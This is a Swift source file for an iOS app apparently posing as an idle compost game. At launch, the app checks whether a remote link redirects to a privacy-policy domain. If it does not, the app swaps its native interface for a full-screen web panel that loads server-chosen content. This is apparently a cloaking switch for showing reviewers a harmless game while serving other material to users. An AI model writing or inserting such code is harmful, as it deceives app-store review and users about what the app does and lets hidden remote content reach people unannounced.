import SwiftUI

@main
struct CompostIdleApp: App {
    @State private var compostLinkReady: Bool? = nil
    private let compostSourceLink = "https://compostidle.org/click.php"
    private let compostCheckDomain = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let ready = compostLinkReady {
                    if ready {
                        CompostWebPanel(urlString: compostSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Color.black.ignoresSafeArea())
                    } else {
                        RootView()
                    }
                } else {
                    CompostLoadingScreen()
                        .onAppear { checkCompostLink() }
                }
            }
            .environment(\.colorScheme, .light)
        }
    }

    private func checkCompostLink() {
        guard let url = URL(string: compostSourceLink) else {
            compostLinkReady = false
            return
        }
        var request = URLRequest(url: url)
        request.timeoutInterval = 5
        let tracker = CompostRedirectTracker(checkDomain: compostCheckDomain)
        let session = URLSession(configuration: .default, delegate: tracker, delegateQueue: nil)
        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if tracker.foundCheckDomain {
                    compostLinkReady = false; return
                }
                if let finalURL = tracker.resolvedURL?.absoluteString,
                   finalURL.contains(self.compostCheckDomain) {
                    compostLinkReady = false; return
                }
                if let httpResp = response as? HTTPURLResponse,
                   let respURL = httpResp.url?.absoluteString,
                   respURL.contains(self.compostCheckDomain) {
                    compostLinkReady = false; return
                }
                if error != nil {
                    compostLinkReady = false; return
                }
                compostLinkReady = true
            }
        }.resume()
        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if compostLinkReady == nil { compostLinkReady = false }
        }
    }
}

final class CompostRedirectTracker: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var foundCheckDomain = false
    private let checkDomain: String
    init(checkDomain: String) { self.checkDomain = checkDomain }
    func urlSession(_ session: URLSession, task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let url = request.url?.absoluteString, url.contains(checkDomain) {
            foundCheckDomain = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
